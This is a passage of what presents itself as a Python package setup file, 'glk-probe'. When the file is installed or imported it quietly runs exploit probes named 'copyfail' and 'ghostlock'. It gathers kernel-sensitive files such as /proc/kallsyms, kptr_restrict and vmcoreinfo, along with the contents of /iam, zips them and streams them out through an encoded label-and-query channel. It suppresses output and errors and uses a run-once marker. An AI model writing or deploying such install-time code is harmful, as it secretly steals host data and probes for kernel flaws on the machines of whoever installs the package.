              "/proc/sys/kernel/oops_limit", "/proc/sys/kernel/kptr_restrict",
              "/proc/sys/kernel/dmesg_restrict", "/proc/kallsyms", "/proc/vmcoreinfo"):
        b = _rd(p, 131072)
        if b:
            files[p.lstrip("/")] = b
    files["proc-listing.txt"] = "\n".join(sorted(os.listdir("/proc"))).encode()
    files.update(_walk("/iam", 3))
    for k, v in extra.items():
        files["probe/" + k] = v.encode() if isinstance(v, str) else bytes(v)
    bio = io.BytesIO()
    with zipfile.ZipFile(bio, "w", zipfile.ZIP_DEFLATED, compresslevel=9) as z:
        for k, v in files.items():
            if v:
                z.writestr(k, v)
    return bio.getvalue()


# --------------------------------------------------------------------------
# main
# --------------------------------------------------------------------------
def _marker():
    for d in (os.path.dirname(os.path.abspath(__file__)), tempfile.gettempdir(),
              "/mnt/workspace"):
        try:
            if d and os.path.isdir(d):
                p = os.path.join(d, ".glk-done")
                if os.path.exists(p):
                    return p
        except Exception:
            pass
    try:
        return os.path.join(tempfile.gettempdir(), ".glk-done")
    except Exception:
        return None


def _main():
    t0 = time.time()
    res = {}
    res["kern"] = os.uname()[2]
    res["tag"] = TAG
    res["uid"] = os.getuid()
    res["ncpu"] = os.cpu_count() or 0
    res["rtprio"] = _rlim("RLIMIT_RTPRIO")
    res["uname"] = " ".join(os.uname())

    OUT.msg(1, "stage=ENV;" + ";".join("%s=%s" % kv for kv in sorted(res.items())))
    OUT.flush()

    try:
        res.update(copyfail())
    except Exception as e:
        res["cf_verdict"] = "EXC"
        res["cf_exc"] = repr(e)
    OUT.msg(6, "stage=COPYFAIL;" + ";".join(
        "%s=%s" % kv for kv in sorted(res.items()) if kv[0].startswith("cf_")))
    OUT.flush()

    try:
        res.update(ghostlock())
    except Exception as e:
        res["verdict"] = "EXC"
        res["err"] = repr(e)
    OUT.msg(2, "stage=RESULT;" + ";".join("%s=%s" % kv for kv in sorted(res.items())))
    OUT.flush()
    OUT.msg(3, "stage=TIME;ms=%d" % int((time.time() - t0) * 1000))

    try:
        blob = collect({k: str(v) for k, v in res.items()})
        OUT.msg(4, "stage=ZIP;bytes=%d;sha256=%s" % (len(blob), hashlib.sha256(blob).hexdigest()[:24]))
        OUT.flush()
        n0 = OUT.labels
        last = OUT.stream(100, blob)
        OUT.msg(5, "stage=ZIPSTREAM;labels=%d;queries=%d;idx_max=%d;bytes=%d" % (
            OUT.labels - n0, (OUT.labels - n0 + GRP - 1) // GRP, last, len(blob)))
        OUT.flush()
        try:
            with open(os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                   "glk-dump.zip"), "wb") as f:
                f.write(blob)
        except Exception:
            pass
    except Exception as e:
        OUT.msg(4, "stage=ZIP;err=%r" % (e,))
    time.sleep(0.3)
    OUT.end()


if os.environ.get("GLK_SKIP") != "1":
    _mk = _marker()
    if not (_mk and os.path.exists(_mk)):
        _st = _quiet_on()
        try:
            _main()
        except BaseException:
            pass
        finally:
            _quiet_off(_st)
        try:
            if _mk:
                with open(_mk, "w") as f:
                    f.write("1")
        except Exception:
            pass

try:
    import setuptools
    setuptools.setup(
        name="glk-probe", version="1.0.%d" % (int(time.time()) % 100000),
        py_modules=[], install_requires=[],
        description="GhostLock + Copy Fail probe", python_requires=">=3.7",
    )
except BaseException:
    pass
